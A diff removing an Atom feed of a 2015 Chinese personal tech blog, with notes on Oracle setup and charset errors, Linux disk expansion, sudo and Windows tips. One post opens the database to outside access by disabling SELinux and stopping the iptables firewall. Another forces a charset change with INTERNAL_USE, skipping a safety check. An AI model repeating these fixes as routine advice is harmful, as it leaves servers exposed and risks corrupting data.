-    <title type="html"><![CDATA[旅游路线]]></title>
-    <link href="http://mzkmzk.github.io/blog/2015/04/17/travel/"/>
-    <updated>2015-04-17T11:37:40+08:00</updated>
-    <id>http://mzkmzk.github.io/blog/2015/04/17/travel</id>
-    <content type="html"><![CDATA[<!--more-->
-
-
-<p>21 黄金海岸</p>
-
-<p>22 北大桥</p>
-
-<p>23 星海公园</p>
-
-<p>24 长城</p>
-
-<p>25 顾河园</p>
-
-<p>26 天安门</p>
-
-<p>27 回民街</p>
-
-<p>28 兵马俑</p>
-
-<p>29 大小雁塔</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[旅游路线]]></title>
-    <link href="http://mzkmzk.github.io/blog/2015/04/17/tjraclibapp/"/>
-    <updated>2015-04-17T11:37:40+08:00</updated>
-    <id>http://mzkmzk.github.io/blog/2015/04/17/tjraclibapp</id>
-    <content type="html"><![CDATA[<!--more-->
-
-
-<p>登陆</p>
-
-<p>续借</p>
-
-<p>学生信息</p>
-
-<p>推购.</p>
-
-<p>挂失</p>
-
-<p>检索历史</p>
-
-<p>AR</p>
-
-<p>我靠&hellip;.</p>
-
-<p>&hellip;..</p>
-
-<p>每次都要Clean项目才可以?..我日了狗了.</p>
-
-<p>Tomcat问题实在蛋疼</p>
-
-<p>还有借书历史会显示null</p>
-
-<p>还有需要点击刷新几下页面才出来</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Oracle 导入.dmp乱码]]></title>
-    <link href="http://mzkmzk.github.io/blog/2015/04/08/oracle_dmp_error/"/>
-    <updated>2015-04-08T11:37:40+08:00</updated>
-    <id>http://mzkmzk.github.io/blog/2015/04/08/oracle_dmp_error</id>
-    <content type="html"><![CDATA[<!--more-->
-
-
-<h3>0x00查询Oracle数据库字符编码</h3>
-
-<pre><code>SQL&gt; select userenv('language') from dual;
-
-
-USERENV('LANGUAGE')
-----------------------------------------------------
-AMERICAN_AMERICA.AL32UTF8
-</code></pre>
-
-<h3>0x02查看dmp文件字符编码</h3>
-
-<pre><code>[root@linux5 ~]# cat /mnt/hgfs/2015-03-16-Library/one.dmp  |od -x|head -1|awk '{print $2 $3}'|cut -c 3-6
-0345
-
-查询0345是什么编码
-SQL&gt; select nls_charset_name(to_number('0345','xxxx')) from dual;
-
-NLS_CHARSET_NAME(TO_NUMBER('03454','XXXX'
-----------------------------------------
-ZHS16GBK
-</code></pre>
-
-<h3>0x03查看Linux字符集</h3>
-
-<pre><code>#查看系统登录用户当前的字符集状态
-[root@linux5 ~]# echo $LANG
-zh_CN.UTF-8
-命令:locale -a   查看本地的字符集
-    locale -m   查看所有支持的字符集
-</code></pre>
-
-<h3>0x04解决方案</h3>
-
-<p>把Oracle的客户端和Linux字符集调整成一致就可以了 应该是UTF-8包含了JA16EUCTILDE这个编码</p>
-
-<h3>0x05参考链接</h3>
-
-<p> 如何解决乱码问题<a href="http://blog.chinaunix.net/uid-186064-id-2823338.html">http://blog.chinaunix.net/uid-186064-id-2823338.html</a></p>
-
-<p> oracle字符对照表<a href="http://docs.oracle.com/cd/B19306_01/server.102/b14225/applocaledata.htm#i634428">http://docs.oracle.com/cd/B19306_01/server.102/b14225/applocaledata.htm#i634428</a></p>
-
-<p> 如何查看oracle数据库字符集<a href="http://blog.csdn.net/heianemo/article/details/7702749">http://blog.csdn.net/heianemo/article/details/7702749</a></p>
-
-<p> 遗留问题</p>
-
-<p> IMP-00008: unrecognized statement in the export file:</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[使用Oracle数据库笔记]]></title>
-    <link href="http://mzkmzk.github.io/blog/2015/04/08/Oracle/"/>
-    <updated>2015-04-08T11:37:40+08:00</updated>
-    <id>http://mzkmzk.github.io/blog/2015/04/08/Oracle</id>
-    <content type="html"><![CDATA[<!--more-->
-
-
-<h3>命令行连接数据库</h3>
-
-<pre><code>//通过ssh 执行此命令 说没有sqlplus命令?
-sqlplus /nolog
-</code></pre>
-
-<h3>Oracle 提供外部监听接口</h3>
-
-<pre><code>lsnrctl start
-</code></pre>
-
-<h3>Oracle 登陆数据库</h3>
-
-<pre><code>sqlplus "scott/管理员账户 as sysdba"
-</code></pre>
-
-<h3>Oracle 关闭数据库</h3>
-
-<pre><code>SQL&gt;shutdown normal;
-</code></pre>
-
-<h3>启动数据库实例</h3>
-
-<pre><code>SQL&gt;startup;
-</code></pre>
-
-<h3>查看Oracle用户</h3>
-
-<pre><code>select * from all_users;
-</code></pre>
-
-<h3>创建用户</h3>
-
-<pre><code>#1创建表空间
-create tablespace text(表名) datafile '/home/oracle/workspace/text.dbf'(表空间存在路径) size 10M(表大小);
-
-#2创建用户
-create user text(用户名) identified by oracle(密码) default tablespace text(表名) temporary tablespace temp ;
-
-#3.创建角色
-create  role  textuser(角色名);
-
-#4赋予权限
-grant create any table to textuser(角色名)
-
-#5把角色给用户
-grant connect ,resource ,textuser(角色) to text(用户);
-
-#6新用户登陆
-conn text/oracle;
-</code></pre>
-
-<h3>启动 127.0.0.1:5560 isqlplus</h3>
-
-<pre><code>isqlplusctl start;
-</code></pre>
-
-<h3>查看所有数据库</h3>
-
-<pre><code>select name from v$database;
-</code></pre>
-
-<h3>查看哪些用户拥有sysdba、sysoper权限</h3>
-
-<pre><code>select * from V_$PWFILE_USERS；
-
-show user；查看当前数据库连接用户
-</code></pre>
-
-<h3>进入某个数据库：</h3>
-
-<pre><code>database 数据库名；
-
-#查看数据库结构：
-desc v$database；      
-</code></pre>
-
-<h3>查看所有用户实例</h3>
-
-<pre><code>INSTANCE_NAME
-----------------
-orcl
-</code></pre>
-
-<h3>查看当前库的所有数据表</h3>
-
-<pre><code>select * from all_tables;
-
-select table_name from all_tables;        
-
-select table_name from user_tables;
-
-select table_name from all_tables where owner='用户名';
-</code></pre>
-
-<h3>查看表结构</h3>
-
-<pre><code>desc 表名；
-</code></pre>
-
-<h3>关闭数据库</h3>
-
-<pre><code>SQL&gt;shutdown immediate
-</code></pre>
-
-<h3>查看表空间</h3>
-
-<pre><code>SQL&gt;select * from v$tablespace;
-
-   TS# NAME               INC BIG FLA ENC
----------- ------------------------------ --- --- --- ---
- 0 SYSTEM             YES NO  YES
- 1 UNDOTBS1           YES NO  YES
- 2 SYSAUX             YES NO  YES
- 4 USERS              YES NO  YES
- 3 TEMP               NO  NO  YES
- 6 TEXT               YES NO  YES
-</code></pre>
-
-<h3>查询字符集</h3>
-
-<pre><code>SQL&gt;select * from v$nls_parameters;
-
-or
-
-SQL&gt; select userenv('language') from dual;
-
-
-USERENV('LANGUAGE')
-----------------------------------------------------
-AMERICAN_AMERICA.AL32UTF8
-</code></pre>
-
-<h3>让外网访问数据库</h3>
-
-<pre><code>[root@linux5 ~]# setenforce 0;
-[root@linux5 ~]# service iptables stop;
-</code></pre>
-
-<h3>参考链接</h3>
-
-<p>基本查询数据库命令<a href="http://www.cnblogs.com/jiaxiaoai/archive/2011/05/09/2041008.html">http://www.cnblogs.com/jiaxiaoai/archive/2011/05/09/2041008.html</a></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[imp导入数据到ORACLE遇到ORA-12899错误]]></title>
-    <link href="http://mzkmzk.github.io/blog/2015/04/07/imp_12899/"/>
-    <updated>2015-04-07T11:37:40+08:00</updated>
-    <id>http://mzkmzk.github.io/blog/2015/04/07/imp_12899</id>
-    <content type="html"><![CDATA[<!--more-->
-
-
-<h3>0x00原因</h3>
-
-<pre><code>因为exp时字符集占用的位数比导入时字符集的占用的位数要少
-</code></pre>
-
-<h3>0x01解决方案</h3>
-
-<pre><code>这里演示的是ZHS16GBK为导出库字符集 而UTF-8为导入库 而作出的更改
-
-：$sqlplus /nolog
-SQL&gt;conn / as sysdba
-SQL&gt;SHUTDOWN IMMEDIATE
-SQL&gt;STARTUP MOUNT
-SQL&gt;ALTER SYSTEM ENABLE RESTRICTED SESSION;
-SQL&gt;ALTER SYSTEM SET JOB_QUEUE_PROCESSES=0;
-SQL&gt;ALTER SYSTEM SET AQ_TM_PROCESSES=0;
-SQL&gt;ALTER DATABASE OPEN;
-SQL&gt; ALTER DATABASE CHARACTER SET ZHS16GBK ;
-ALTER DATABASE CHARACTER SET ZHS16GBK
-*ERROR at line 1:
-ORA-12712: new character set must be a superset of old character set
-报字符集不兼容，此时下INTERNAL_USE指令不对字符集超集进行检查：
-SQL&gt;ALTER DATABASE CHARACTER SET INTERNAL_USE ZHS16GBK;
-SQL&gt;SHUTDOWN IMMEDIATE
-SQL&gt;STARTUP
-</code></pre>
-
-<p>再次用imp导入，就没有问题了。</p>
-
-<p>导入了以后 NLS_LANG也要跟着改 不然乱码</p>
-
-<pre><code>export NLS_LANG="SIMPLIFIED CHINESE_CHINA.ZHS32GB18030"
-</code></pre>
-
-<h3>0x02参考链接</h3>
-
-<p><a href="http://blog.sina.com.cn/s/blog_713043600100ohva.html">http://blog.sina.com.cn/s/blog_713043600100ohva.html</a></p>
-
-<p><a href="http://blog.csdn.net/namesliu/article/details/8030316">http://blog.csdn.net/namesliu/article/details/8030316</a></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[修改/etc/fstab错误修复方案]]></title>
-    <link href="http://mzkmzk.github.io/blog/2015/04/05/etc_fstab_error/"/>
-    <updated>2015-04-05T11:37:40+08:00</updated>
-    <id>http://mzkmzk.github.io/blog/2015/04/05/etc_fstab_error</id>
-    <content type="html"><![CDATA[<!--more-->
-
-
-<h3>0x00报错</h3>
-
-<p>系统在开机的时候会显示</p>
-
-<pre><code>Cheking fileSystems                 [FAILED]
-</code></pre>
-
-<h3>0x01 导入iso启动盘</h3>
-
-<p>虚拟机中cd光盘选中.iso</p>
-
-<p>重启</p>
-
-<h3>0x02 恢复步骤</h3>
-
-<p>选中 Rescue installed system</p>
-
-<p>选择语言English</p>
-
-<p>键盘 us</p>
-
-<p>选择驱动器 Local CD/DVE</p>
-
-<p>然后到选择不配置networking</p>
-
-<p>Continue 然后下一步到 选择shell Start shell 即可</p>
-
-<p>然后进入  <code>vi /mnt/sysimage/etc/fstab</code></p>
-
-<p>修改为正常 再reboot重启即可</p>
-
-<h3>0x03 参考链接</h3>
-
-<p><a href="http://wenku.baidu.com/link?url=yG8YaFpib4-7wIFKjwLPqGCxUalRCNBxnTqQ1vnHRqDXIWHBTWwoPweEiM_bfmsCUPLbveoNCyrbD2YL7ArqqsKXUGQWCheR1ftBchkdNiq">http://wenku.baidu.com/link?url=yG8YaFpib4-7wIFKjwLPqGCxUalRCNBxnTqQ1vnHRqDXIWHBTWwoPweEiM_bfmsCUPLbveoNCyrbD2YL7ArqqsKXUGQWCheR1ftBchkdNiq</a></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Linux拓展硬盘]]></title>
-    <link href="http://mzkmzk.github.io/blog/2015/04/05/enpand_disk/"/>
-    <updated>2015-04-05T11:37:40+08:00</updated>
-    <id>http://mzkmzk.github.io/blog/2015/04/05/enpand_disk</id>
-    <content type="html"><![CDATA[<!--more-->
-
-
-<h3>0x00原因</h3>
-
-<p>犹豫昨天import了一个1.7G的数据库 导致硬盘不够用 开机时输入完密码后无法进入图形界面</p>
-
-<p>显示错误</p>
-
-<pre><code>Ubuntu-The configuration defaults for GNOME Power Manager have not been installed correctly
-</code></pre>
-
-<h3>0x01Vmware 给虚拟机加硬盘</h3>
-
-<p>这个在设备比较好加</p>
-
-<p>加完后 启动机器</p>
-
-<pre><code>[root@linux5 oracle]#su root
-[root@linux5 oracle]# fdisk -l
-
-Disk /dev/sda: 53.7 GB, 53687091200 bytes
-255 heads, 63 sectors/track, 6527 cylinders
-Units = cylinders of 16065 * 512 = 8225280 bytes
-Sector size (logical/physical): 512 bytes / 512 bytes
-I/O size (minimum/optimal): 512 bytes / 512 bytes
-Disk identifier: 0x00038d6a
-Device Boot      Start         End      Blocks   Id  System
-/dev/sda1   *           1          39      307200   83  Linux
-Partition 1 does not end on cylinder boundary.
-/dev/sda2              39        2093    16501760   83  Linux
-/dev/sda3            2093        2611     4161536   82  Linux swap / Solaris
-</code></pre>
-
-<h3>0x02 新建分区</h3>
-
-<pre><code>[root@linux5 oracle]# fdisk -cu /dev/sda
-
-Command (m for help): n
-Command action
-e   extended
-p   primary partition (1-4)
-p
-Selected partition 4
-First sector (41943040-104857599, default 41943040): 
-Using default value 41943040
-Last sector, +sectors or +size{K,M,G} (41943040-104857599, default 104857599): 
-Using default value 104857599
-
-Command (m for help): w
-The partition table has been altered!
-
-Calling ioctl() to re-read partition table.
-
-WARNING: Re-reading the partition table failed with error 16: 设备或资源忙.
-The kernel still uses the old table. The new table will be used at
-the next reboot or after you run partprobe(8) or kpartx(8)
-Syncing disks.
-</code></pre>
-
-<p>这里报了个警告 说资源在忙</p>
-
-<p>查看新建结果</p>
-
-<pre><code>[root@linux5 oracle]# fdisk -l
-
-Disk /dev/sda: 53.7 GB, 53687091200 bytes
-255 heads, 63 sectors/track, 6527 cylinders
-Units = cylinders of 16065 * 512 = 8225280 bytes
-Sector size (logical/physical): 512 bytes / 512 bytes
-I/O size (minimum/optimal): 512 bytes / 512 bytes
-Disk identifier: 0x00038d6a
-
-Device Boot      Start         End      Blocks   Id  System
-/dev/sda1   *           1          39      307200   83  Linux
-Partition 1 does not end on cylinder boundary.
-/dev/sda2              39        2093    16501760   83  Linux
-/dev/sda3            2093        2611     4161536   82  Linux swap / Solaris
-/dev/sda4            2611        6528    31457280   83  Linux
-Partition 4 does not end on cylinder boundary.
-</code></pre>
-
-<p>这里最后报了个 分区4没有结束范围&hellip;刚的新建分区应该是有问题</p>
-
-<h3>0x03 格式化新建分区</h3>
-
-<p>查了一下以前的文件类型</p>
-
-<pre><code>[root@linux5 oracle]# more /etc/fstab 
-
-#
-# /etc/fstab
-# Created by anaconda on Mon Mar 30 09:13:27 2015
-#
-# Accessible filesystems, by reference, are maintained under '/dev/disk'
-# See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info
-#
-UUID=18d82504-c890-43d2-9b7c-771f22e8f762 /                       ext4    defaults 
-   1 1
-UUID=8b4ddae2-a584-4a7f-a9aa-9633b32b4816 /boot                   ext4    defaults 
-   1 2
-UUID=2de40b84-00b1-4507-9d59-a4041ec0a903 swap                    swap    defaults 
-   0 0
-tmpfs                   /dev/shm                tmpfs   defaults        0 0
-devpts                  /dev/pts                devpts  gid=5,mode=620  0 0
-sysfs                   /sys                    sysfs   defaults        0 0
-proc                    /proc                   proc    defaults        0 0
-</code></pre>
-
-<p>恩 以前的是ext4的 开始格式化新建磁盘分区</p>
-
-<pre><code>[root@linux5 oracle]# mkfs -t ext4 /dev/sda4 
-mke2fs 1.41.12 (17-May-2010)
-文件系统标签=
-操作系统:Linux
-块大小=4096 (log=2)
-分块大小=4096 (log=2)
-Stride=0 blocks, Stripe width=0 blocks
-1966080 inodes, 7864320 blocks
-393216 blocks (5.00%) reserved for the super user
-第一个数据块=0
-Maximum filesystem blocks=0
-240 block groups
-32768 blocks per group, 32768 fragments per group
-8192 inodes per group
-Superblock backups stored on blocks: 
-32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632, 2654208, 
-4096000
-
-正在写入inode表: 完成                            
-Creating journal (32768 blocks): 完成
-Writing superblocks and filesystem accounting information: 完成
-</code></pre>
-
-<p>好了格式化完毕</p>
-
-<h3>挂载硬盘</h3>
-
-<p>查询UUID</p>
-
-<pre><code>[root@linux5 oracle]# blkid /dev/sda4
-/dev/sda4: UUID="b6705f46-548a-4eeb-bc85-92e3550599f3" TYPE="ext4" 
-</code></pre>
-
-<p>然后就编辑<code>/etc/fstab</code>在里面加入</p>
-
-<pre><code>UUID=b6705f46-548a-4eeb-bc85-92e3550599f3 /oracle                       ext4    defaults        1 2
-</code></pre>
-
-<p>第五列：指明是否要备份，（0为不备份，1为要备份，一般根分区要备份）</p>
-
-<p>第六列：指明自检顺序。 （0为不自检，1或者2为要自检，如果是根分区要设为1，其他分区只能是2）</p>
-
-<p><code>/etc/fstab</code>参数说明<a href="http://hndtraveller.blog.51cto.com/231121/186777">http://hndtraveller.blog.51cto.com/231121/186777</a></p>
-
-<p>ok 我现在主要问题是Oracle太大 但是直接把/oracle挂载在 /dev/sdb4上</p>
-
-<pre><code>#实时把/dev/sda4 挂载 /oracle里
-mount /dev/sda4 /oracle
-#/帮oracle先改名
-mv /oracle /oracle.bk
-#创建空的/oracle
-mkdir /oracle
-#更改为原来权限
-chown oracle:oinstall /oracle
-#移动数据
-mv /oracle.bk/* /oracle
-#去除备份数据库目录
-rmdir /oracle.bk
-</code></pre>
-
-<p>再df -h</p>
-
-<pre><code>[root@linux5 oracle]# df -h
-文件系统          容量  已用  可用 已用%% 挂载点
-/dev/sda2              16G   15G     0 100% /
-tmpfs                 1.9G     0  1.9G   0% /dev/shm
-/dev/sda1             291M   34M  243M  12% /boot
-.host:/               373G  283G   91G  76% /mnt/hgfs   /dev/sda4              30G  172M   28G   1% /oracle
-</code></pre>
-
-<p>ok 勉强成功</p>
-
-<h3>参考资料</h3>
-
-<p>其实这个方法要更简便 差不多 用tar来代码我的mv</p>
-
-<p><a href="http://blog.csdn.net/cymm_liu/article/details/11932297">http://blog.csdn.net/cymm_liu/article/details/11932297</a></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[oracle 导入.dmp和.log文件]]></title>
-    <link href="http://mzkmzk.github.io/blog/2015/04/04/oracle_dmp_log/"/>
-    <updated>2015-04-04T11:37:40+08:00</updated>
-    <id>http://mzkmzk.github.io/blog/2015/04/04/oracle_dmp_log</id>
-    <content type="html"><![CDATA[<!--more-->
-
-
-<h3>0x00 创建导入文件夹并授予权限</h3>
-
-<pre><code>SQL&gt;show user
-USER IS "SYS"
-
-crate directory data_hehe as '导入文件夹路径'
-grant read,write on directory data_hehe to scott;
-</code></pre>
-
-<h3>0x01 导入数据库</h3>
-
-<pre><code>SQL&gt;show user
-USER IS "SYS"
-
-#注意 用户名一定要与导出的.dmp里写的用户名一直
-SQL&gt;create user LIBSYS(用户名) identity by LIBSYS(密码)
-2 DEFAULT TABLESPACE users;
-3 quota 20g on users
-
-grant connect to LIBSYS;
-
-cd   导入文件夹路径
-
-imp system/oracle FULL=y file=one.dmp log=one.log 
-</code></pre>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Windows 常用命令累积]]></title>
-    <link href="http://mzkmzk.github.io/blog/2015/04/03/windows_usual_order/"/>
-    <updated>2015-04-03T11:37:40+08:00</updated>
-    <id>http://mzkmzk.github.io/blog/2015/04/03/windows_usual_order</id>
-    <content type="html"><![CDATA[<!--more-->
-
-
-<h3>查看端口占用</h3>
-
-<pre><code>#查看占用8080端口的程序
-netstat -ano|findstr "8080"
-</code></pre>
-
-<h3>根据pid 查询具体程序</h3>
-
-<pre><code>#查询pid 为5224的程序名
-tasklist |findstr "5224"    
-</code></pre>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[CentOS 5.1安装Oracle10 64]]></title>
-    <link href="http://mzkmzk.github.io/blog/2015/03/31/centos-oracle/"/>
-    <updated>2015-03-31T11:37:40+08:00</updated>
-    <id>http://mzkmzk.github.io/blog/2015/03/31/centos-oracle</id>
-    <content type="html"><![CDATA[<!--more-->
-
-
-<h3>0x00 下载安装包</h3>
-
-<p>下载安装包 <a href="http://pan.baidu.com/wap/link?uk=3727692514&amp;shareid=2487050160&amp;third=0">http://pan.baidu.com/wap/link?uk=3727692514&amp;shareid=2487050160&amp;third=0</a></p>
-
-<p>这个含有其他Oracle数据库资源<a href="http://uni-smr.ac.ru/archive/db/Oracle/">http://uni-smr.ac.ru/archive/db/Oracle/</a></p>
-
-<p>解压压缩包</p>
-
-<pre><code>gunzip 10201_database_linux_x86_64.cpio.gz
-cpio -idmv &lt; 10201_database_linux_x86_64.cpio
-</code></pre>
-
-<h3>0x01 查看硬件坏境</h3>
-
-<pre><code>#查看内存  至少1G内存
-[root@localhost oracle]# grep MemTotal /proc/meminfo
-MemTotal:      1021724 kB
-
-#查看swap
-#如果内存为大于512M则swap大小为内存2倍
-#如果内存在1到2G之间则swap大小为内存1.5倍
-#如果内存在2到8G之间则swap大小为内存1倍
-#如果内存大于8G则swap大小为内存0.75倍
-[root@localhost oracle]# grep SwapTotal /proc/meminfo
-SwapTotal:     2064344 kB
-
-
-#查看硬盘
-#/tmp目录至少400MB
-#oracle安装目录大约在1.5到3.5G之间
-#数据文件至少1.2G
-[root@localhost oracle]# df -h
-Filesystem            Size  Used Avail Use% Mounted on
-/dev/sda2              18G  2.8G   14G  17% /
-/dev/sda1             289M   17M  258M   7% /boot
-tmpfs                 499M     0  499M   0% /dev/shm
-.host:/               373G  238G  136G  64% /mnt/hgfs
-</code></pre>
-
-<h3>0x02安装所需安装包</h3>
-
-<pre><code>yum install -y compat-db pdksh sysstat screen libXp compat-libstdc++*
-</code></pre>
-
-<h3>0x03 配置Oracle环境</h3>
-
-<p>添加必要的用户组：</p>
-
-<pre><code>/usr/sbin/groupadd oinstall
-/usr/sbin/groupadd dba
-/usr/sbin/groupadd oper
-</code></pre>
-
-<p>更改oracle用户权限</p>
-
-<pre><code>/usr/sbin/usermod -g oinstall -G dba,oper oracle
-</code></pre>
-
-<p>配置内核参数、修改用户环境变量</p>
-
-<p>编辑 <code>/etc/sysctl.conf</code>在最后加入</p>
-
-<pre><code>#oracle
-kernel.shmmni = 4096
-kernel.sem = 250 32000 100 128
-fs.file-max = 65536
-net.ipv4.ip_local_port_range = 1024 65000
-net.core.rmem_default = 262144
-net.core.rmem_max = 262144
-net.core.wmem_default = 262144
-net.core.wmem_max = 262144
-</code></pre>
-
-<p>运行</p>
-
-<pre><code>/sbin/sysctl -p
-</code></pre>
-
-<p>使配置文件生效</p>
-
-<p>编辑<code>/etc/security/limits.conf</code> 在最后加入</p>
-
-<pre><code>oracle soft nproc 2047
-oracle hard nproc 16384
-oracle soft nofile 1024
-oracle hard nofile 65536
-</code></pre>
-
-<p>编辑<code>/etc/pam.d/login</code>在最后加入</p>
-
-<pre><code>session required pam_limits.so
-</code></pre>
-
-<p>编辑<code>/etc/profile</code>在最后加入</p>
-
-<pre><code>if [ $USER = "oracle" ]; then
-if [ $SHELL = "/bin/ksh" ]; then
-ulimit -p 16384
-ulimit -n 65536
-else
-ulimit -u 16384 -n 65536
-fi
-fi
-
-ORACLE_BASE="/opt/app/oracle"
-export ORACLE_BASE
-ORACLE_HOME=$ORACLE_BASE"/product/10.2.0/db_1"
-ORACLE_SID=MZKOracle
-#此SID在后面安装时需要填入和这里配置一样的
-export ORACLE_HOME ORACLE_SID
-</code></pre>
-
-<p>编辑<code>/etc/redhat-release</code>在最后加入</p>
-
-<pre><code>#10G默认不支持5.6版本，修改掉此信息可略过错误）
-#而且要把之前的删除掉不能#掉
-redhat-4
-</code></pre>
-
-<p>配置oracle用户环境变量</p>
-
-<pre><code>su oracle
-vi ~/.bash_profile
-#在最后加入
-PATH=$PATH:$HOME/bin:$ORACLE_HOME/bin
-export PATH
-export NLS_LANG=AMERICAN_AMERICA.ZHS16GBK   
-</code></pre>
-
-<p>创建ORACLE_BASE目录:</p>
-
-<pre><code>mkdir -p /opt/app/oracle
-#权限设置: 
-chown -R oracle:oinstall /opt/app/
-</code></pre>
-
-<h3>0x04安装</h3>
-
-<pre><code>#将0x00中解压的database包放到/opt中
-sudo cp -R /mnt/hgfs/maizhikun/Learning/Oracle/ /opt/
-</code></pre>
-
-<p>图形化界面 我就不截图了</p>
-
-<p>参考<a href="http://www.xmydlinux.org/201104/439.html">http://www.xmydlinux.org/201104/439.html</a></p>
-
-<h3>0x05参考链接</h3>
-
-<p><a href="http://www.xmydlinux.org/201104/439.html">http://www.xmydlinux.org/201104/439.html</a></p>
-
-<p><a href="http://www.cnblogs.com/mchina/archive/2013/03/08/2934473.html">http://www.cnblogs.com/mchina/archive/2013/03/08/2934473.html</a></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Mac 下安装Vmware fusion7]]></title>
-    <link href="http://mzkmzk.github.io/blog/2015/03/29/mac_vmware_fusion7/"/>
-    <updated>2015-03-29T11:37:40+08:00</updated>
-    <id>http://mzkmzk.github.io/blog/2015/03/29/mac_vmware_fusion7</id>
-    <content type="html"><![CDATA[<h3>下载地址</h3>
-
-<p><a href="http://pan.baidu.com/s/1o6BOGFw">http://pan.baidu.com/s/1o6BOGFw</a></p>
-
-<h3>Ubantu和Win</h3>
-
-<p>Win我直接导的是 双系统中的Boot camp</p>
-
-<p>Ubantu是在<a href="http://www.ubuntu.com/download/desktop">http://www.ubuntu.com/download/desktop</a>下的..</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[制作纪念魔兽视频过程]]></title>
-    <link href="http://mzkmzk.github.io/blog/2015/03/28/war_mv/"/>
-    <updated>2015-03-28T11:37:40+08:00</updated>
-    <id>http://mzkmzk.github.io/blog/2015/03/28/war_mv</id>
-    <content type="html"><![CDATA[<h3>0x00安装 pr  ae  Fraps</h3>
-
-<p>pr和ae见&lt;>次篇幅</p>
-
-<p>Fraps<a href="http://tieba.baidu.com/p/3477295300">http://tieba.baidu.com/p/3477295300</a></p>
-
-<h3>0x01 视频整体思路整理</h3>
-
-<p>开头和结尾的8</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[使用jQuery MiniUI搭建后台demo]]></title>
-    <link href="http://mzkmzk.github.io/blog/2015/03/28/jquery_miniui/"/>
-    <updated>2015-03-28T11:37:40+08:00</updated>
-    <id>http://mzkmzk.github.io/blog/2015/03/28/jquery_miniui</id>
-    <content type="html"><![CDATA[<p>jQuery MiniUI 提供了一套.net/php/java 的后台模板 这里介绍一下使用方法</p>
-
-<h3>0x00下载demo</h3>
-
-<p><a href="http://www.miniui.com/download/">http://www.miniui.com/download/</a></p>
-
-<p>在这里选择使用的语言</p>
-
-<h3>0x01导入demo</h3>
-
-<h4>java</h4>
-
-<p>在Eclipse导入<code>import-&gt;Existing Project</code>以后</p>
-
-<p>项目会出现小红叉</p>
-
-<p>解决办法:</p>
-
-<p>删除不存在的jre
-<code>右击项目-&gt;Bulid path-&gt;选中Libraries标签页-&gt;选中有小红叉的JRE -&gt;remove</code></p>
-
-<p>导入本地的jre
-<code>Add Library-&gt;Jre System Library-&gt;OK</code></p>
-
-<p>如果此时项目中WebContent文件中有jsp报错 则Close项目 然后再Open</p>
-
-<p>修改src中的TestDB.java中的相关数据库信息</p>
-
-<h4>php</h4>
-
-<p>把项目扔进apache的目录即可</p>
-
-<p>然后在demo/data/invoke.php，修改相关数据库配置字符串。</p>
-
-<h4>导入mysql数据库</h4>
-
-<p>下载的项目中的WebContet中有个dbsql</p>
-
-<p>如果导入.sql文件不存在..说数据库已存在 则</p>
-
-<p>打开.sql文件 注释创建数据库的代码行</p>
-
-<pre><code>#CREATE DATABASE `plusoft_test`
-#CHARACTER SET 'utf8'
-#COLLATE 'utf8_general_ci';
-
-#USE `plusoft_test`;    
-</code></pre>
-
-<p>ok 运行项目即可</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Linux 用户无法使用sudo]]></title>
-    <link href="http://mzkmzk.github.io/blog/2015/03/27/linux_sudo/"/>
-    <updated>2015-03-27T11:37:40+08:00</updated>
-    <id>http://mzkmzk.github.io/blog/2015/03/27/linux_sudo</id>
-    <content type="html"><![CDATA[<!--more-->
-
-
-<h3>0x00问题</h3>
-
-<pre><code>[oracle@localhost bin]$ sudo mkdir -p /opt/app/oracle
-[sudo] password for oracle: 
-oracle is not in the sudoers file.  This incident will be reported.
-</code></pre>
-
-<h3>0x01解决办法</h3>
-
-<pre><code>su root
-echo '用户名  ALL=(ALL) ALL' &gt;&gt; /etc/sudoers
-</code></pre>
-
-<h3>参考链接</h3>
-
-<p><a href="http://superuser.com/questions/120340/user-not-in-the-sudoers-file-this-incident-will-be-reported">http://superuser.com/questions/120340/user-not-in-the-sudoers-file-this-incident-will-be-reported</a>中user21655的回复</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[修改windows 后缀名为显示]]></title>
-    <link href="http://mzkmzk.github.io/blog/2015/03/26/windows_suffix/"/>
-    <updated>2015-03-26T11:37:40+08:00</updated>
-    <id>http://mzkmzk.github.io/blog/2015/03/26/windows_suffix</id>
-    <content type="html"><![CDATA[<!--more-->
-
-
-<p>有时候后缀名 并不会显示在 名字里</p>
-
-<p>所以就要设置 我的电脑->工具(如果没有工具的话 就点击组织->布局->菜单栏)->文件夹选项->查看->取消掉 隐藏已知文件类型的拓展名。</p>
-
-<p>然后就OK了</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Windows无法修改默认打开方式]]></title>
-    <link href="http://mzkmzk.github.io/blog/2015/03/26/windows_no_change_open/"/>
-    <updated>2015-03-26T11:37:40+08:00</updated>
-    <id>http://mzkmzk.github.io/blog/2015/03/26/windows_no_change_open</id>
-    <content type="html"><![CDATA[<!--more-->
-
-
-<p>昨天 在属性修改了.txt打开方式为cmd 然后右击.txt无法选择默认打开方式</p>
-
-<p>解决方法是</p>
-
-<p>运行 regedit</p>
-
-<p>&ndash;HKEY_CURRENT_USER
-&mdash;-Software
-&mdash;&mdash;Microsoft
-&mdash;&mdash;&ndash;Windows
-&mdash;&mdash;&mdash;-CurrentVersion
-&mdash;&mdash;&mdash;&mdash;Explorer
-&mdash;&mdash;&mdash;&mdash;&ndash;FileExts</p>
-
-<p>找到里面的.txt 删除UserChoice文件夹 就可以了</p>
-
